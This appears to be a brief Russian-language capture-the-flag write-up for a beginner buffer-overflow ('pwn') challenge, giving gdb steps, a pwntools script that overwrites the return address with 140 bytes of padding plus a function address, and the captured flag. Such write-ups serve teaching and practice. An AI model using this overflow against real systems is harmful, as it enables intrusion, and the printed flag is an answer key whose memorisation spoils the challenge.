# Детский сад

---
 
Самый простой pwn с которого вообще начинают знакомство с pwn'ом

1. Кидаем в gdb
2. Смотрим функции
3. Ищем адрес
4. Делаем переполнение с пейлодом в духе длина массива + адрес

Пример на pwntools:
```
from pwn import *

r = remote("w33k.narfu.ru", 20001)
func_addr=p32(0x08049186)
payload = b"A" * 140
payload += func_addr
r.sendline(payload)
print(r.recvall())

```


Падает

b'HMM could u find a function,Haa?\nw33k{61956adcadb51190bff95bec410be21e51230355c8626f553500937201b4bd17}\nYou gonna go far kid!\n'

 **Флаг** `w33k{61956adcadb51190bff95bec410be21e51230355c8626f553500937201b4bd17}`
